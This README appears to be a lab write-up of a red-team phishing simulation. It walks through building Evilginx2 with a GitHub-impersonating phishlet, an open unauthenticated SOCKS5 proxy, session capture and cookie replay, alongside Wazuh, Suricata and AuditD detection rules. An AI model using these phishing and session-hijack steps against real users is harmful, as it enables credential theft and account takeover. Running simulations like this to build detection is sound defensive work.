# Red-Team-Phishing-Infrastructure-and-Detection-Simulation-using-Evilginx-and-Wazuh

**Project Owner:** Adekilekun Fatiu
**Date of Execution:** 07/07/2025
**Project Title:** Red Team Phishing Infrastructure and Detection Simulation using Evilginx and Wazuh

---

## 1. Objective

Simulate a real-world credential theft operation using Evilginx2 phishing proxy while simultaneously monitoring and detecting activities using Wazuh SIEM with Kibana dashboards.

---

## 2. Scope of Engagement

| Item               | Description                        |
| ------------------ | ---------------------------------- |
| Authorized Range   | AWS-hosted VPS lab environment     |
| Authorized Domains | Internal test domains only         |
| Type of Engagement | Controlled Red Team Simulation     |
| Constraints        | No targeting of real-world systems |

---

## 3. Tools & Technologies

| Tool/Tech             | Purpose                          |
| --------------------- | -------------------------------- |
| Evilginx2             | Phishing Proxy                   |
| NameCheap             | Domain Provider                  |
| AWS Hosted Zones      | DNS Management                   |
| Docker/Docker-Compose | Containerization & Orchestration |
| Wazuh 4.12            | SIEM / XDR                       |
| Dante SOCKS5          | Proxy Server                     |
| Suricata              | Intrusion Detection System (IDS) |
| AuditD                | Linux Audit Daemon               |
| Amazon EC2            | VPS Infrastructure (Ubuntu)      |

---

## 4. Infrastructure Design

**VPS 1 (Attacker Node)**:

* Evilginx2
* Dante SOCKS5
* Wazuh Agent
* Suricata
* AuditD

**VPS 2 (Detection Node)**:

* Wazuh Manager (via Docker Compose)
* Wazuh Dashboard
* Wazuh Indexer

SSH is restricted via key-based authentication on both VPS instances.

---

## 5. Attack Simulation Phases

### Phase 1: Environment Setup

```bash
# Provision EC2
# VPS 1: t2.micro (1GB RAM)
# VPS 2: t2.large (8GB RAM)
```

* Register test domain and configure DNS on AWS Hosted Zones

### Phase 2: Evilginx Setup (VPS 1)

```bash
sudo apt update && sudo apt upgrade
sudo apt install golang git -y

# Clone and build Evilginx
cd /home/ubuntu
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
go build

# Run test
sudo ./evilginx2
```

**Domain Setup:**

```bash
config domain blakkhcloud.com
config ipv4 YOUR.VPS1.IP
phishlet hostname github github.blakkhcloud.com
phishlet enable github
```

**Dante SOCKS5 Setup:**

```bash
sudo apt install dante-server -y
sudo nano /etc/danted.conf
```

Paste:

```conf
logoutput: /var/log/danted.log
internal: 0.0.0.0 port = 1080
external: eth0
method: username none
user.notprivileged: nobody
client pass {
  from: 0.0.0.0/0 to: 0.0.0.0/0
  log: connect disconnect error
}
pass {
  from: 0.0.0.0/0 to: 0.0.0.0/0
  protocol: tcp udp
  log: connect disconnect error
}
```

```bash
sudo touch /var/log/danted.log
sudo chmod 666 /var/log/danted.log
sudo systemctl enable danted
sudo systemctl start danted
sudo ufw allow 1080/tcp
```

**Test Proxy:**

```bash
curl -x socks5://<vps-ip>:1080 http://ifconfig.me
```

### Phase 3: Wazuh Manager Setup (VPS 2)

```bash
sudo apt update && sudo apt upgrade
curl -sSL https://get.docker.com | sh
sudo systemctl start docker

# Docker Compose
curl -L "https://github.com/docker/compose/releases/download/v2.12.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose

# Wazuh Docker
git clone https://github.com/wazuh/wazuh-docker.git -b v4.12.0
cd wazuh-docker/single-node
docker-compose -f generate-indexer-certs.yml run --rm generator
docker-compose up -d
```

### Phase 4: Wazuh Configuration (Manager)

```bash
docker exec -it wazuh.manager bash
nano /var/ossec/etc/ossec.conf
```

Enable:

```xml
<logall>yes</logall>
<enabled>yes</enabled>
```

Add:

```xml
<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>5763</rules_id>
  <timeout>180</timeout>
</active-response>
```

Exit and restart:

```bash
exit
docker-compose restart wazuh.manager
```

### Phase 5: Wazuh Agent Setup (VPS 1)

Deploy via agent script from dashboard. Then:

```bash
sudo systemctl daemon-reload
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

### Phase 6: Log Source Integration (Agent)

```bash
# Edit config
sudo nano /var/ossec/etc/ossec.conf
```

Add:

```xml
<directories check_all="yes" report_changes="yes" realtime="yes">/home/ubuntu/evilginx2</directories>
```

Install Suricata:

```bash
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt-get update
sudo apt-get install suricata -y
```

Configure `/etc/suricata/suricata.yaml` and add `eve.json` to ossec.conf.

Install AuditD:

```bash
sudo apt install auditd
nano /etc/audit/audit.rules
```

Paste:

```bash
-a exit,always -F arch=b64 -S execve -k audit-wazuh-c
-a always,exit -F path=/home/ubuntu/evilginx2 -F perm=x -k evilginx_exec
```

Reload:

```bash
sudo auditctl -R /etc/audit/audit.rules
sudo augenrules --load
```

### Phase 7: Attack Execution

```bash
lures create github
lures edit <id> path /login
lures edit <id> hostname github.blakkhcloud.com
lures get-url <id>
sessions
sessions <id>
```

Replay cookies with EditThisCookie.

---

## 6. Detection Use Cases

| Detection Point            | Wazuh Rule ID | Visibility                |
| -------------------------- | ------------- | ------------------------- |
| Evilginx process starts    | 100100        | Dashboard Alert           |
| Phishlet files modified    | 100101        | File Integrity Monitoring |
| SOCKS5 Proxy activity      | 100102/100103 | Port & Process Detection  |
| SSH Operator Access        | 100105        | Auth Logs                 |
| Outbound Target Connection | 100106        | Network Monitoring        |

---

## 7. Mitigation Recommendations

* Block Evilginx signatures on IDS/IPS
* Monitor Dante/Evilginx processes at endpoint
* Enforce MFA, token refresh intervals
* Adopt phishing-resistant authentication (e.g., passkeys)
* Conduct phishing simulations and user awareness

---

## 8. Lessons Learned

* Evilginx2 is an effective phishing proxy
* Wazuh, with custom rules, successfully detects red team behavior
* SOCKS5 proxies provide good opsec and traffic obfuscation
* Suricata and AuditD enhance visibility on low-level behavior

---

## 9. Project Deliverables

* ✅ Evilginx phishlet templates
* ✅ Custom Wazuh detection rules
* ✅ Audit.rules for AuditD
* ✅ Dante SOCKS5 proxy config (`danted.conf`)
* ✅ `ossec.conf` templates for Wazuh Manager & Agent
* ✅ Full setup + attack simulation guide (this file)

---

## 10. Ethical Disclaimer

This project was executed in a private cloud lab environment solely for educational and ethical cybersecurity training. No real-world services or unauthorized systems were targeted. All assets, infrastructure, and domains are under the control of the project owner.

---

**GitHub Repository:** \[Add Link Here]
**Author:** Adekilekun Fatiu
**License:** MIT or Educational Use Only
